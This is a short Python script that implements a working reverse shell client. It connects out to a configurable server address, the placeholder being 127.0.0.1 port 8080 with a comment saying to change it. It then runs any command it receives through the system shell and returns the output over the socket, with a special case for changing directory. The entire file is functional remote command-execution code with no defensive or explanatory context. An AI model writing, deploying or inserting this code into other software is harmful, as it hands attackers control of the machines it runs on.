import socket
import subprocess
import os

def connect():
    host = '127.0.0.1' # Change to the IP address of the server and port number
    port = 8080

    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print('Connected to the server.')

        while True:
            # Receive the command from the server
            command = s.recv(1024).decode()

            if command.lower() == 'exit':
                break

            # Handle cd command separately
            if command.lower().startswith('cd '):
                # Extract the directory from the command
                directory = command.split(' ', 1)[1] # Split on 'cd' and '/path/to/directory'
                try:
                    # Change directory
                    os.chdir(directory)
                    # Send the new directory back to the server
                    s.send(f"Changed directory to {directory}".encode())
                except Exception as e:
                    s.send(str(e).encode())
            else:
                # Execute the command and get the output
                output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = output.communicate()
                result = stdout.decode() if stdout else stderr.decode()

                # Send the output back to the server
                s.send(result.encode())

        # Close the socket connection
        s.close()
        print('Disconnected from the server.')

    except Exception as e:
        print('Error:', str(e))

if __name__ == '__main__':
    connect()
